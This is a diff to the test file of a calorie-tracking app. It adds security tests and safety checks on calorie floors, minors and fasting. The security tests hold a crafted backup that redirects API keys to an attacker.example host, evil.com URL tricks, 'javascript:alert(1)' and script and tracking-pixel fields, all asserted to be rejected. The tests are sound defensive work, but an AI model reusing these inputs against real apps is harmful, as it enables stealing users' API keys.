@@ -2,14 +2,14 @@
 // Run: npx tsc -p tests/tsconfig.json && node --test .test-build/tests/logic.test.js
 import assert from 'node:assert/strict';
 import { test } from 'node:test';
-import { analyzeMeal, buildMealPrompt, callProvider, parseMealJson, providerOrder, DEFAULT_AI_SETTINGS } from '../src/lib/ai';
-import { buildBackup, parseBackup } from '../src/lib/backup';
+import { analyzeMeal, buildMealPrompt, callProvider, CANCELLED, isPrivateHost, parseMealJson, providerOrder, sanitizeImportedAI, serverUrlProblem, DEFAULT_AI_SETTINGS } from '../src/lib/ai';
+import { buildBackup, parseBackup, parseBackupReport } from '../src/lib/backup';
 import { blsFood, searchBLS } from '../src/lib/bls';
 import { COMMUNITY_RECIPES } from '../src/lib/communityRecipes';
 import { newRecipe, perServing, recipeFood, resolveCommunity, resolveRef, scaleItems, searchRecipes, validateCommunity } from '../src/lib/recipes';
 import type { BlsRow } from '../src/lib/blsData';
 import { addDays, dayKey, lastNDays, weekdayOf } from '../src/lib/dates';
-import { isFastingDay, stageFor } from '../src/lib/fasting';
+import { activeFastingDays, isFastingDay, stageFor } from '../src/lib/fasting';
 import { searchGeneric, genericFoods } from '../src/lib/genericFoods';
 import { ALL_KEYS, _dicts, translate } from '../src/lib/i18n';
 import { dayGoal, weightOn } from '../src/lib/goals';
@@ -32,6 +32,8 @@ import {
 import { dailyTotals, dayStatus, judgeDay, monthGrid, monthSummary, streakInfo } from '../src/lib/streaks';
 import { buildColors, contrast, DEFAULT_APPEARANCE, ensureContrast, mix, normalizeAppearance, normalizeHex, THEMES } from '../src/lib/themes';
 import { foodFromOFF, parseRetailer, rankHits } from '../src/lib/openFoodFacts';
+import { draftProblem } from '../src/lib/validation';
+import { goalStatus, minHealthyWeight } from '../src/lib/nutrition';
 import type { AISettings, DiaryEntry, Food, Profile } from '../src/lib/types';
 
 const profile: Profile = {
@@ -65,7 +67,7 @@ test('daily goal: deficit, floor and gain', () => {
   assert.equal(dailyKcalGoal(profile, 72, now), 1460);
   assert.equal(dailyKcalGoal({ ...profile, paceKgPerWeek: 1 }, 72, now), 1200);
   assert.equal(dailyKcalGoal({ ...profile, goal: 'maintain', paceKgPerWeek: 0 }, 72, now), 2010);
-  assert.ok(dailyKcalGoal({ ...profile, goal: 'gain' }, 72, now) > 2010);
+  assert.ok(dailyKcalGoal({ ...profile, goal: 'gain', targetWeightKg: 80 }, 72, now) > 2010);
 });
 
 test('macro grams from split', () => {
@@ -301,7 +303,7 @@ test('backup round-trips and drops invalid rows', () => {
 test('custom goals: free pace, exact kcal, own activity and maintenance', () => {
   // 0.4 kg per week is 440 kcal per day
   assert.equal(Math.round(kcalPerDayForPace(0.4)), 440);
-  const gain = { ...profile, goal: 'gain' as const, paceKgPerWeek: 0.4 };
+  const gain = { ...profile, goal: 'gain' as const, targetWeightKg: 80, paceKgPerWeek: 0.4 };
   // maintenance 2006 + 440 = 2446 -> 2450
   assert.equal(dailyKcalGoal(gain, 72, now), 2450);
   const d = goalDetails(gain, 72, now);
@@ -312,16 +314,17 @@ test('custom goals: free pace, exact kcal, own activity and maintenance', () => 
   const exact = goalDetails({ ...profile, goalMode: 'custom', customKcal: 1850 }, 72, now);
   assert.equal(exact.kcal, 1850);
   assert.ok(exact.kgPerWeek < 0);
-  // custom mode ignores the minimum floor but warns below BMR
+  // an exact number below the minimum is raised to it as well (safety floor), and says so
   const low = goalDetails({ ...profile, goalMode: 'custom', customKcal: 1100 }, 72, now);
-  assert.equal(low.kcal, 1100);
-  assert.ok(low.warnings.includes('below_bmr'));
+  assert.equal(low.kcal, 1200);
+  assert.ok(low.warnings.includes('floored'));
+  assert.ok(goalDetails({ ...profile, goalMode: 'custom', customKcal: 1300 }, 72, now).warnings.includes('below_bmr'));
   // auto mode floors and says so
   const floored = goalDetails({ ...profile, paceKgPerWeek: 1 }, 72, now);
   assert.equal(floored.kcal, 1200);
   assert.ok(floored.warnings.includes('floored'));
   // pace over ~1 % of body weight per week is flagged
-  assert.ok(goalDetails({ ...profile, goal: 'gain', paceKgPerWeek: 1 }, 72, now).warnings.includes('fast_pace'));
+  assert.ok(goalDetails({ ...profile, goal: 'gain', targetWeightKg: 80, paceKgPerWeek: 1 }, 72, now).warnings.includes('fast_pace'));
 
   // own activity factor replaces the level; own maintenance replaces BMR x activity
   assert.equal(goalDetails({ ...profile, goal: 'maintain', customActivityFactor: 1.5 }, 72, now).maintenance, Math.round(1459 * 1.5));
@@ -356,16 +359,21 @@ const oats: Food = { id: 'generic:oats', source: 'generic', name: 'Haferflocken'
 const entry = (date: string, food: Food, grams: number, createdAt = 0): DiaryEntry => ({ id: `${date}-${createdAt}`, date, meal: 'breakfast', food, grams, createdAt });
 
 test('streaks: logged days, goal judgement and calendar', () => {
-  // goal 2000: hit band 1900–2100; losing counts anything below, gaining anything above
+  // goal 2000: hit band 1900–2100, with 10 % room in the goal's direction
   assert.equal(judgeDay(1950, 2000, 'maintain'), 'hit');
   assert.equal(judgeDay(1800, 2000, 'maintain'), 'under');
   assert.equal(judgeDay(2200, 2000, 'maintain'), 'over');
-  assert.equal(judgeDay(1200, 2000, 'lose'), 'hit');
+  assert.equal(judgeDay(1820, 2000, 'lose'), 'hit');
   assert.equal(judgeDay(2101, 2000, 'lose'), 'over');
-  assert.equal(judgeDay(3000, 2000, 'gain'), 'hit');
+  assert.equal(judgeDay(2190, 2000, 'gain'), 'hit');
   assert.equal(judgeDay(1890, 2000, 'gain'), 'under');
+  // eating far less (or far more) than the goal is never rewarded as a hit
+  assert.equal(judgeDay(1200, 2000, 'lose'), 'under');
+  assert.equal(judgeDay(300, 2000, 'lose'), 'under');
+  assert.equal(judgeDay(0, 2000, 'lose'), 'under');
+  assert.equal(judgeDay(3000, 2000, 'gain'), 'over');
 
-  const goalFor = () => ({ kcal: 100, goal: 'lose' as const });
+  const goalFor = () => ({ kcal: 55, goal: 'lose' as const });
   const totals = dailyTotals([
     entry('2026-10-10', apple, 100),
     entry('2026-10-11', apple, 100),
@@ -594,4 +602,218 @@ test('recipes: per serving, logging as a food, scaling, search', () => {
   assert.deepEqual(scaleItems(r, 3).map((i) => i.grams), [150, 450]);
   assert.deepEqual(searchRecipes([r], 'skyr').length, 1);
   assert.deepEqual(searchRecipes([r], '', 'main').length, 0);
+});
+
+
+/* ---------- Security and safety (release review, Oct 2026) ---------- */
+
+const okReply = { ok: true, json: async () => ({ choices: [{ message: { content: '{}' } }] }) };
+function recordingFetch() {
+  const calls: { url: string; init: any }[] = [];
+  const fn = async (url: string, init: any) => {
+    calls.push({ url, init });
+    return okReply as any;
+  };
+  return { calls, fn };
+}
+const wrapBackup = (extra: object) => JSON.stringify({ app: 'OpenPlate', ...extra });
+const goodFood = { id: 'x', source: 'custom', name: 'X', per100: { kcal: 100, protein: 5, carbs: 10, fat: 2 }, servings: [] };
+
+test('security: a backup file cannot redirect API keys', async () => {
+  // the attack from the review: a backup that points OpenAI at another server
+  const evil = parseBackup(
+    wrapBackup({
+      ai: {
+        primary: 'openai',
+        fallback: 'local',
+        minConfidence: 0.7,
+        providers: {
+          openai: { model: 'gpt-x', baseUrl: 'https://attacker.example/v1' },
+          local: { model: 'm', baseUrl: 'https://attacker.example/v1' },
+        },
+      },
+    }),
+  );
+  const current = { ...DEFAULT_AI_SETTINGS, primary: 'anthropic' as const };
+  const ai = sanitizeImportedAI(evil.ai, current);
+  assert.equal(ai.providers.openai.baseUrl, DEFAULT_AI_SETTINGS.providers.openai.baseUrl);
+  assert.equal(ai.providers.local.baseUrl, DEFAULT_AI_SETTINGS.providers.local.baseUrl);
+  assert.equal(ai.primary, 'anthropic'); // provider choice stays this device's
+  assert.equal(ai.fallback, null);
+  assert.equal(ai.providers.openai.model, 'gpt-x'); // model names are fine to carry over
+  assert.equal(ai.minConfidence, 0.7);
+  // whatever the file says, the key goes to OpenAI
+  const f = recordingFetch();
+  await callProvider({ provider: 'openai', config: ai.providers.openai, apiKey: 'sk-REAL', prompt: 'p' }, f.fn);
+  assert.equal(f.calls[0].url, 'https://api.openai.com/v1/chat/completions');
+  // odd model names (which end up in URLs) are not taken over
+  assert.equal(sanitizeImportedAI({ providers: { gemini: { model: '../../x?y' } } }, current).providers.gemini.model, DEFAULT_AI_SETTINGS.providers.gemini.model);
+  assert.deepEqual(sanitizeImportedAI('nonsense', current), current);
+});
+
+test('security: keys never travel over plain http to the internet, and never follow redirects', async () => {
+  assert.equal(serverUrlProblem('https://api.openai.com/v1'), null);
+  assert.equal(serverUrlProblem('http://192.168.1.20:11434/v1'), null);
+  assert.equal(serverUrlProblem('http://localhost:1234/v1'), null);
+  assert.equal(serverUrlProblem('http://my-pc.local:11434/v1'), null);
+  assert.equal(serverUrlProblem('http://100.101.102.103:11434/v1'), null); // Tailscale
+  assert.equal(serverUrlProblem('http://example.com/v1'), 'insecure');
+  assert.equal(serverUrlProblem('http://8.8.8.8/v1'), 'insecure');
+  assert.equal(serverUrlProblem('http://192.168.1.20.evil.com/v1'), 'insecure');
+  assert.equal(serverUrlProblem('https://api.openai.com@evil.com/v1'), 'invalid'); // user-info trick
+  assert.equal(serverUrlProblem('ftp://x/v1'), 'invalid');
+  assert.equal(serverUrlProblem('javascript:alert(1)'), 'invalid');
+  assert.equal(serverUrlProblem(''), 'empty');
+  assert.ok(isPrivateHost('10.0.0.1') && isPrivateHost('172.20.1.1') && !isPrivateHost('172.32.1.1'));
+  assert.ok(isPrivateHost('[::1]') && isPrivateHost('fd12:3456::1') && !isPrivateHost('2001:db8::1'));
+
+  const f = recordingFetch();
+  await assert.rejects(
+    callProvider({ provider: 'local', config: { model: 'm', baseUrl: 'http://evil.example/v1' }, apiKey: 'k', prompt: 'p' }, f.fn),
+    /plain http/,
+  );
+  await assert.rejects(callProvider({ provider: 'openai', config: { model: 'm', baseUrl: 'http://api.openai.com/v1' }, apiKey: 'k', prompt: 'p' }, f.fn), /plain http/);
+  assert.equal(f.calls.length, 0, 'nothing may be sent');
+  // the default local address is empty (no guessed LAN address any more)
+  await assert.rejects(callProvider({ provider: 'local', config: DEFAULT_AI_SETTINGS.providers.local, apiKey: null, prompt: 'p' }, f.fn), /No server address/);
+  for (const provider of ['anthropic', 'gemini', 'openai'] as const) {
+    await callProvider({ provider, config: DEFAULT_AI_SETTINGS.providers[provider], apiKey: 'k', prompt: 'p' }, async (url, init: any) => {
+      f.calls.push({ url, init });
+      return { ok: true, json: async () => ({ content: [{ type: 'text', text: '{}' }], candidates: [{ content: { parts: [{ text: '{}' }] } }], choices: [{ message: { content: '{}' } }] }) } as any;
+    });
+  }
+  assert.ok(f.calls.every((c) => c.init.redirect === 'error' && c.url.startsWith('https://')));
+});
+
+test('AI: cancelling stops the analysis; impossible values are dropped', async () => {
+  const ctrl = new AbortController();
+  ctrl.abort();
+  await assert.rejects(analyzeMeal('img', { ...DEFAULT_AI_SETTINGS, primary: 'anthropic' }, async () => 'k', 'en', undefined, async () => '{}', ctrl.signal), new RegExp(CANCELLED));
+  const parsed = parseMealJson(
+    JSON.stringify({
+      items: [
+        { name: 'Pasta', grams: 300, kcal: 450, protein: 15, carbs: 80, fat: 8, confidence: 0.9 },
+        { name: 'Giant', grams: 50000, kcal: 900, protein: 1, carbs: 1, fat: 1 },
+        { name: 'Dense', grams: 100, kcal: 2000, protein: 1, carbs: 1, fat: 1 },
+        { name: 'Heavy macros', grams: 100, kcal: 300, protein: 90, carbs: 90, fat: 10 },
+        { name: 'Too few kcal', grams: 200, kcal: 10, protein: 20, carbs: 40, fat: 10, confidence: 0.9 },
+      ],
+      confidence: 0.9,
+    }),
+  );
+  assert.deepEqual(parsed.items.map((i) => i.name), ['Pasta', 'Too few kcal']);
+  assert.equal(parsed.items[1].kcal, 20 * 4 + 40 * 4 + 10 * 9);
+  assert.ok(parsed.confidence <= 0.3); // corrected answers make the app ask the fallback
+});
+
+test('security: backup import rebuilds every row from checked values', () => {
+  const report = parseBackupReport(
+    wrapBackup({
+      recipes: [
+        // tracking-pixel photo, non-text steps, fake community recipe with testers
+        { id: 'community:oats', name: 'Oats', servings: 2, steps: [{ evil: 1 }, 42, 'Mix.'], items: [{ food: goodFood, grams: 100 }], photo: 'https://tracker.example/p.gif', tags: 'vegan', testedBy: ['me'], author: 'x', source: 'community' },
+        { id: 'r2', name: 'P', servings: 2, steps: [], items: [{ food: goodFood, grams: 100 }], photo: 123 },
+        { id: 'r3', name: 'P', servings: 1e-9, steps: [], items: [{ food: goodFood, grams: 100 }] },
+        { id: 'r4', name: 'P', servings: 2, steps: [], items: [{ food: goodFood, grams: 100 }], photo: 'data:image/svg+xml;base64,PHN2Zz4=' },
+      ],
+      entries: [
+        { id: 'e1', date: '2026-10-01', meal: 'lunch', grams: -1e12, food: goodFood },
+        { id: 'e2', date: '2026-10-01', meal: 'lunch', grams: 100, food: { ...goodFood, per100: { kcal: 100 } } }, // no macros
+        { id: 'e3', date: '2026-10-01', meal: 'lunch', grams: 100, food: { ...goodFood, imageUrl: 'https://tracker.example/x.png', evil: '<script>' } },
+        { id: 'e3', date: '2026-10-02', meal: 'lunch', grams: 100, food: goodFood }, // duplicate id
+      ],
+      water: { '2026-10-01': 1e15, '2026-10-02': 750 },
+      weights: [{ date: '2026-10-01', kg: 2 }, { date: '2026-10-02', kg: 70 }],
+      appearance: { accent: 123, macroColors: 'red' },
+      layout: { hiddenTabs: 5, tabOrder: 'x' },
+      fastingHistory: [{ id: 'f', start: 1, targetHours: 1e9 }],
+      profile: { ...profile, name: 'x'.repeat(5000), macroSplit: { carbs: 90, protein: 90, fat: 90 }, customKcal: 100, goalMode: 'custom' },
+    }),
+  );
+  const d = report.data;
+  // recipes with a bad photo keep the recipe but lose the photo; a 1e-9-serving recipe is dropped
+  assert.deepEqual(d.recipes.map((x) => x.name), ['Oats', 'P', 'P']);
+  assert.ok(d.recipes.every((x) => x.photo === undefined));
+  const r = d.recipes[0];
+  assert.equal(r.photo, undefined);
+  assert.deepEqual(r.steps, ['Mix.']);
+  assert.deepEqual(r.tags, []);
+  assert.equal(r.source, 'own');
+  assert.equal(r.testedBy, undefined);
+  assert.ok(!r.id.startsWith('community:'));
+  assert.deepEqual(d.entries.map((e) => e.id), ['e3']);
+  assert.equal(d.entries[0].food.imageUrl, undefined);
+  assert.ok(!('evil' in d.entries[0].food));
+  assert.deepEqual(d.water, { '2026-10-02': 750 });
+  assert.deepEqual(d.weights, [{ date: '2026-10-02', kg: 70 }]);
+  assert.deepEqual(d.fastingHistory, []);
+  assert.equal(d.profile?.name?.length, 40);
+  assert.deepEqual(d.profile?.macroSplit, { carbs: 50, protein: 20, fat: 30 });
+  assert.equal(d.profile?.goalMode, undefined); // 100 kcal is not taken over
+  assert.equal(report.skipped, 6); // r3, e1, e2, the water day, the 2 kg weight, the fast
+  // wrong types in look and layout never crash
+  assert.doesNotThrow(() => normalizeAppearance(d.appearance));
+  assert.doesNotThrow(() => normalizeLayout(d.layout));
+  assert.equal(normalizeAppearance(d.appearance).accent, undefined);
+  // real photos and Open Food Facts images still come through
+  const fine = parseBackup(
+    wrapBackup({
+      recipes: [{ id: 'r', name: 'R', servings: 2, steps: ['a'], items: [{ food: goodFood, grams: 1 }], photo: 'data:image/jpeg;base64,/9j/AAAA', tags: ['vegan', 'nope'] }],
+      customFoods: [{ ...goodFood, imageUrl: 'https://images.openfoodfacts.org/images/products/400/1.jpg' }],
+    }),
+  );
+  assert.equal(fine.recipes[0].photo, 'data:image/jpeg;base64,/9j/AAAA');
+  assert.deepEqual(fine.recipes[0].tags, ['vegan']);
+  assert.equal(fine.customFoods[0].imageUrl, 'https://images.openfoodfacts.org/images/products/400/1.jpg');
+});
+
+test('safety: weight loss only for adults with a healthy target', () => {
+  const nowS = new Date(2026, 9, 15);
+  const teen = { ...profile, birthYear: 2012, heightCm: 160, startWeightKg: 60, targetWeightKg: 50 };
+  assert.equal(goalStatus(teen, 60, nowS), 'minor');
+  const teenGoal = goalDetails({ ...teen, paceKgPerWeek: 1 }, 60, nowS);
+  assert.equal(teenGoal.kcal, Math.round(teenGoal.maintenance / 10) * 10);
+  assert.ok(teenGoal.warnings.includes('minor'));
+  // an exact low number doesn't get round it either
+  assert.ok(goalDetails({ ...teen, goalMode: 'custom', customKcal: 500 }, 60, nowS).kcal >= teenGoal.maintenance - 5);
+
+  // BMI 17.6: no further loss
+  const thin = { ...profile, heightCm: 160, startWeightKg: 45, targetWeightKg: 40 };
+  assert.equal(goalStatus(thin, 45, nowS), 'underweight');
+  assert.ok(goalDetails(thin, 45, nowS).warnings.includes('underweight'));
+  assert.ok(goalDetails(thin, 45, nowS).kcal >= goalDetails(thin, 45, nowS).maintenance - 5);
+
+  // target reached: hold the weight
+  assert.equal(goalStatus(profile, 64, nowS), 'reached');
+  assert.ok(Math.abs(goalDetails(profile, 64, nowS).delta) <= 5);
+  assert.ok(goalDetails(profile, 64, nowS).warnings.includes('reached'));
+
+  // nobody gets less than 1200 kcal (or their maintenance, when that is lower), whatever they type
+  for (const kcal of [100, 500, 800, 1100]) assert.ok(goalDetails({ ...profile, goalMode: 'custom', customKcal: kcal }, 72, nowS).kcal >= 1200);
+  assert.ok(goalDetails({ ...profile, sex: 'male', goalMode: 'custom', customKcal: 1200 }, 72, nowS).kcal >= 1500);
+  const tiny = { ...profile, birthYear: 1940, heightCm: 150, startWeightKg: 50, targetWeightKg: 47, activity: 'sedentary' as const };
+  const tinyGoal = goalDetails({ ...tiny, paceKgPerWeek: 1 }, 50, nowS);
+  assert.ok(tinyGoal.kcal <= tinyGoal.maintenance + 5, 'the floor never turns weight loss into gain');
+
+  // profile forms enforce the same
+  const draft = { goal: 'lose' as const, sex: 'female' as const, birthYear: 1995, heightCm: 170, startWeightKg: 75, targetWeightKg: 68, activity: 'light' as const, paceKgPerWeek: 0.5, useCustomActivity: false, customActivityFactor: null };
+  assert.equal(draftProblem(draft, nowS), null);
+  assert.equal(draftProblem({ ...draft, birthYear: 2011 }, nowS)?.key, 'err_minor_lose');
+  assert.equal(draftProblem({ ...draft, birthYear: 2011, goal: 'maintain' }, nowS), null);
+  assert.equal(draftProblem({ ...draft, startWeightKg: 52, targetWeightKg: 50 }, nowS)?.key, 'err_underweight_lose');
+  assert.deepEqual(draftProblem({ ...draft, targetWeightKg: 45 }, nowS), { key: 'err_target_bmi', params: { kg: minHealthyWeight(170) } });
+  assert.equal(minHealthyWeight(170), 53.5);
+});
+
+test('safety: fasting days only for adults, and only as many as the plan has', () => {
+  const nowS = new Date(2026, 9, 15);
+  const monday = '2026-10-12';
+  assert.ok(isFastingDay({ ...profile, fastingPlanId: '5:2', fastingDays: [1] }, monday, nowS));
+  assert.ok(!isFastingDay({ ...profile, birthYear: 2012, fastingPlanId: '5:2', fastingDays: [1] }, monday, nowS));
+  // switching from 5:2 (Mon, Thu) to 6:1 keeps one day
+  assert.deepEqual(activeFastingDays({ fastingPlanId: '6:1', fastingDays: [1, 4] }), [4]);
+  assert.ok(!isFastingDay({ ...profile, fastingPlanId: '6:1', fastingDays: [1, 4] }, monday, nowS));
+  assert.deepEqual(activeFastingDays({ fastingPlanId: '16:8', fastingDays: [1, 4] }), []);
+  // a teen's day goal is never a fasting day's 500 kcal
+  assert.ok(dayGoal({ ...profile, birthYear: 2012, goal: 'maintain', fastingPlanId: '5:2', fastingDays: [1] }, [], monday, nowS).kcal > 1000);
 });
